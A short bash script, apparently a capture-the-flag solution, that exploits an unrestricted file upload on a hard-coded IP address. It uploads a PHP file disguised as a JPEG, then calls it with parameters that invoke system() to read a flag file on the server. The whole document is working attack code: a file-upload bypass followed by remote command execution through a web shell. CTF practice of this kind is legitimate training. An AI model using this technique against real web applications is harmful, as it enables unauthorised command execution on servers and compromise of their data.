#!/bin/bash

cd "$(dirname "${BASH_SOURCE[0]}")"

FILENAME="7um3d3viner4sJam4is.php3"

echo '[*] Uploading file'
if ! curl -sk 'https://46.105.49.65/aacdaefc6040/' \
     -F "fileToUpload=@${FILENAME};type=image/jpeg" \
     -F 'submit=vic511' \
	| grep -q 'has been moved to gallery.'
then
    echo '[-] Failed to upload file'
    exit 1
fi

echo '[*] Retreiving flag'
if ! curl -sk "https://46.105.49.65/aacdaefc6040/images/${FILENAME}?0=system&1=cat+/tmp/Gophermon" \
	| grep -aoE '[0-9a-f]{128}'
then
    echo '[-] Cannot retreive flag'
    exit 1
fi
